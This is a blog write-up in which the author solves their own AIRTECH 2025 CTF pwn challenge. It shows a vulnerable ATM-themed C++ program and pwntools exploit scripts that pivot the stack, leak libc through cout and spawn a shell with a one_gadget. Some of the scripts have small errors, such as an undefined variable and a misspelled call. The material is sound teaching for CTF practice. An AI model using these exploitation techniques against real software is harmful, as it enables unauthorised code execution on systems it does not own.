---
type: Blog
title: AIRTECH'25 - Pwn - See Saw
date: '2025-05-16'
tags: ['ctf', 'pwn', 'airtech', 'writeup', 'overflow', 'stack-pivot','rbp-control','leak-by-cout' ]
draft: false
summary: This was the challenge that i created for airtech ctf 2025
---

This was the challenge that i created for airtech ctf 2025

## Solution

These we the files that were given:

```bash
$ tree
.
├── Dockerfile
├── docker-build.sh
├── flag.txt
├── main
└── main.cpp

$ checksec main                         
[*] '/home/'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

so we have no pie enabled and also no canary so it’s vulnerable to attacks likes ret2libc with proper gadgets, lets read the cpp code and look for any vulnerabilities present.

```bash
#include <iostream>
#include <cstring>
#include <unistd.h>
#include <cstdlib>
#include <limits> 

#define DATA_SIZE 0x1000
char data[DATA_SIZE]; 
void imp(void *address) {
    __asm__ volatile (
        "mov %0, %%rax\n\t"  
        "pop %%rax\n\t"    
        "ret\n\t"           
        :                    
        : "r"(address)       
        : "%rax"             
    );
}

void print_account_statement() {
    char buffer[100];  
    std::cout << "Your account statement:" << std::endl;
    std::cout << "------------------------" << std::endl;
    std::cout << "Account Number: 123456789" << std::endl;
    std::cout << "Balance: $1000" << std::endl;
    std::cout << "Transactions: " << std::endl;
    std::cout << "1. Withdraw: $500" << std::endl;
    std::cout << "2. Deposit: $200" << std::endl;
    std::cout << "3. Withdraw: $300" << std::endl;
    std::cout << "4. Deposit: $100" << std::endl;
    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
    std::cout << "Enter a message: ";
    std::cin.getline(data, sizeof(data)); 
    if (std::cin.fail()) {
        std::cerr << "Failed to read input!" << std::endl;
        exit(1);
    }
    memcpy(buffer, data, sizeof(buffer)+44); 

    std::cout << "Account message: " << buffer << std::endl;
}

void atm_system() {
    int choice;
    
    std::cout << "ATM Menu" << std::endl;
    std::cout << "1. View Account Statement" << std::endl;
    std::cout << "2. Deposit Money" << std::endl;
    std::cout << "3. Withdraw Money" << std::endl;
    std::cout << "Choose an option: ";
    std::cin >> choice;

    switch (choice) {
        case 1:
            print_account_statement();  
            break;
        case 2:
            std::cout << "Depositing money..." << std::endl;
            break;
        case 3:
            std::cout << "Withdrawing money..." << std::endl;
            break;
        default:
            std::cerr << "Invalid choice!" << std::endl;
            break;
    }
}

int main() {
    setvbuf(stdin,0,0,0);
    setvbuf(stdout,0,0,0);

    atm_system();
    return 0;
}

```

Here we can see that `memcpy` is being used to copy input into the buffer of small size causing the overflow, let’s run it gdb and check for offset.

![Screenshot](/static/writeups/airtech/1.png)

we can see the offset at 120 but one thing to be noticed that only 18 bytes are dropping on the return buffer which mean that we can only run only three gadgets, and that’s not enough to call shell, so let’s run `vmmap` and check for available regions of to pivot the stack also we have access of that place, as we can in the code our initial input  is at global variable of data of size 0x1000 so if we pivot the stack their we can as many gadgets as we want there.

```bash
from pwn import *
# context.terminal = ["tmux", "splitw", "-h"]
elf = context.binary = ELF("./main")
libc = elf.libc

p=process(aslr=True)

p.sendlineafter(b"option:",b"1")
p.recvuntil(b"message:")

pop_rbp = 0x40118d 

payload = cyclic(120)
payload += p64(pop_rbp)
payload += p64(elf.sym.data+136) # => pivoted the stack to this location 
payload += p64(leave_ret) # => mov rbp in rsp and ret
p.sendline(payload)
p.interactive()
```

running this payload shows that our stack is pivoted to this section as seen in `*RSP 0x4044b8 (data+152) ◂— 0` now lets leak the address using `cout` because we don’t have puts in the code, for in order to call `cout` we need gadgets like `pop rdi` and `pop rsi`, but as confirmed through `ROPgadget` both of the gadgets aren’t available, but then how do we get the leak?

Here I created a technique which I just think of randomly and worked, so as we know the `cout` is already being called in code multiple of times so what I think that those `cout` arguments are already set up and only if we call the existing section of code where `cout` is being called by just moving or popping `rax` before calling that part of code to call `cout`  again, we can get the leak because just before `cout` it moves `rax` into `rsi` . And luckily enough we have the gadget of `pop rax` . let’s put it into action.

```bash
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
elf = context.binary = ELF("./main")
libc = elf.libc

p=process(aslr=True)

gdb.attach(p)
p.sendlineafter(b"option:",b"1")
p.recvuntil(b"message:")

pop_rax = 0x4011b5
mem_cpy_got = 0x404028
leave_ret = 0x401439
print_acc_func = 0x4011ba # vulnerable function to overflow the buffer
pop_rbp = 0x40118d 

payload = cyclic(120)
payload += p64(pop_rbp)
payload += p64(elf.sym.data+136) # => pivoted the stack to this location 
payload += p64(leave_ret) # => mov rbp in rsp and ret
payload += p64(pop_rax) 
payload += p64(mem_cpy_got) # moved got in rax  
payload += p64(ret2cout) # from this address it moves rax into rdi and automatically sets up cout args and call cout
payload += p64(print_acc_func)

p.sendline(payload)
p.interactive()
```

this code should technically leak the value and ret to the vulnerable function again.

![Screenshot](/static/writeups/airtech/2.png)

we’re getting the leak but after leaking not the intended function that we want to call isn’t calling because `print_account_statement` function is using `leave ret` in the end which move `rbp` into `rsp` and return to that, so to deal this we put the function address on current stack and just before leaking the value `pop rbp` put address of that location where that function is stored on stack.

```bash
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
elf = context.binary = ELF("./main")
libc = elf.libc

p=process(aslr=True)

gdb.attach(p)
p.sendlineafter(b"option:",b"1")
p.recvuntil(b"message:")

pop_rax = 0x4011b5
mem_cpy_got = 0x404028
leave_ret = 0x401439
print_acc_func = 0x4011ba
pop_rbp = 0x40118d 
ret2cout = 0x401402

payload = cyclic(120)
payload += p64(pop_rbp)
payload += p64(elf.sym.data+136) # => pivoted the stack to this location 
payload += p64(leave_ret) # => mov rbp in rsp and ret
payload += p64(pop_rbp) # manually setting up rbp so that after cout, program returns to this!!
payload += p64(elf.sym.data+176) # location of return function
payload += p64(pop_rax) 
payload += p64(mem_cpy_got) # moved got in rax  
payload += p64(ret2cout) # from this address it moves rax into rdi and automatically sets up cout args and call cout
payload += p64(print_acc_func) # put this function on stack for referencing in line number 22

p.sendline(payload)
p.recvuntil(b'qaa')
libc.address = u64(p.recvuntil(b'qaa').rstrip(b'qaa')[-6:].ljust(8, b'\x00')) - 0x169cc0
log.info(f"Libc Base Address: {hex(libc.address)}")
p.interacttive()
```

![Screenshot](/static/writeups/airtech/3.png)

and boom we called the function again now just simply overflow the buffer and get the shell.

```bash
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
elf = context.binary = ELF("./main")
libc = elf.libc

p=process(aslr=True)

gdb.attach(p)
p.sendlineafter(b"option:",b"1")
p.recvuntil(b"message:")

pop_rax = 0x4011b5
mem_cpy_got = 0x404028
leave_ret = 0x401439
print_acc_func = 0x4011ba
pop_rbp = 0x40118d 
ret2cout = 0x401402

payload = cyclic(120)
payload += p64(pop_rbp)
payload += p64(elf.sym.data+136) # => pivoted the stack to this location 
payload += p64(leave_ret) # => mov rbp in rsp and ret
payload += p64(pop_rbp) # manually setting up rbp so that after cout, program returns to this!!
payload += p64(elf.sym.data+176) # location of return function
payload += p64(pop_rax) 
payload += p64(mem_cpy_got) # moved got in rax  
payload += p64(ret2cout) # from this address it moves rax into rdi and automatically sets up cout args and call cout
payload += p64(print_acc_func) # put this function on stack for referencing in line number 22

p.sendline(payload)
p.recvuntil(b'qaa')
libc.address = u64(p.recvuntil(b'qaa').rstrip(b'qaa')[-6:].ljust(8, b'\x00')) - 0x169cc0
log.info(f"Libc Base Address: {hex(libc.address)}")

pop_rdi = libc.address + 0x2a255
pop_r13 = libc.address + 0x3c154
one_gadget = libc.address + 0xd597b

p.recvline()
p.sendline(b"1")
p.recvuntil(b"message:")

payload = cyclic(64)
payload += p64(pop_rdi) # one gadget wants rdi to be NULL
payload += p64(0)
payload += p64(pop_r13) # one gadget wants r13 to be NULL
payload += p64(0)
payload += p64(pop_rbp) # one gadget wants rbp-0x38 to be writeable
payload += p64(elf.sym.data+200) # so that our rbp become writeable
payload += p64(one_gadget) 
#'''
# 0xdd063 execve("/bin/sh", rbp-0x40, r13)
# constraints:
#   address rbp-0x38 is writable
#   rdi == NULL || {"/bin/sh", rdi, NULL} is a valid argv
#   [r13] == NULL || r13 == NULL || r13 is a valid envp
# '''

p.sendline(payload)
p.interactive()

```